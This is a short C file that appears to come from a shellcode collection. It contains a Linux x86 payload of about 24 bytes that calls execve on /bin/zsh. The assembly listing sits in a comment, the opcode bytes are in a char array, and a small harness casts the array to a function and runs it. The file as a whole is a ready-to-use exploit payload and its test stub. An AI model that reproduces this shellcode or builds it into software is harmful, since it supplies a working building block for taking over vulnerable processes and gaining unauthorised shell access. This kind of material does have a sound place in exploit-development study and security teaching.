/*
 * (linux/x86) /bin/zsh shellcode --24 bytes--
	_start:
		xor	eax, eax
		push	eax
		push	0x68737a2f ;/bin/zsh
		push	0x6e69622f
		mov	ebx, esp
		push	eax
		push	ebx
		mov	ecx, esp
		mov	al,  0xb
		int 	0x80

*/

#include <stdio.h>

char shellcode[] = "\x31\xc0\x50\x68\x2f\x7a\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(void)
{
	printf("size = %d\n", sizeof(shellcode));
	(*(void(*)())shellcode)();
}
